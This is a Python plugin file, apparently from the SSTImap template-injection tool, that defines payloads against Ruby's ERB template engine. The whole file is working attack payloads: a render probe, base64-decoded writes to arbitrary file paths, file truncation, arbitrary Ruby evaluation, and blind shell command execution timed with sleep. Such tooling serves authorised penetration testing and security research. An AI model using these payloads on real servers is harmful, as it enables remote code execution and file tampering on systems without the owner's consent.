from pkg.SSTImap.plugins.languages import ruby
from pkg.SSTImap.utils import rand


class Erb(ruby.Ruby):
    def init(self):
        self.update_actions({
            'render': {
                'render': '{code}',
                'header': """<%='{header}'%>""",
                'trailer': """<%='{trailer}'%>""",
                'test_render': f"""<%=({rand.randints[0]}*{rand.randints[1]}).to_s%>""",
                'test_render_expected': f'{rand.randints[0]*rand.randints[1]}'
            },
            'write': {
                'call': 'inject',
                'write': """<%= require'base64';File.open('{path}', 'ab+') {{|f| f.write(Base64.urlsafe_decode64('{chunk_b64}')) }} %>""",
                'truncate': """<%= File.truncate('{path}', 0) %>"""
            },
            'evaluate': {
                'evaluate': """<%= {code} %>"""
            },
            'evaluate_blind': {
                'call': 'inject',
                'evaluate_blind': """<%= require'base64';eval(Base64.urlsafe_decode64('{code_b64}'))&&sleep({delay}) %>"""
            },
            'execute_blind': {
                'call': 'inject',
                'execute_blind': """<%= require'base64';%x(#{{Base64.urlsafe_decode64('{code_b64}')+' && sleep {delay}'}}) %>"""
            },
        })

        self.set_contexts([
            # Text context, no closures
            {'level': 0},
            # TODO: add contexts
        ])
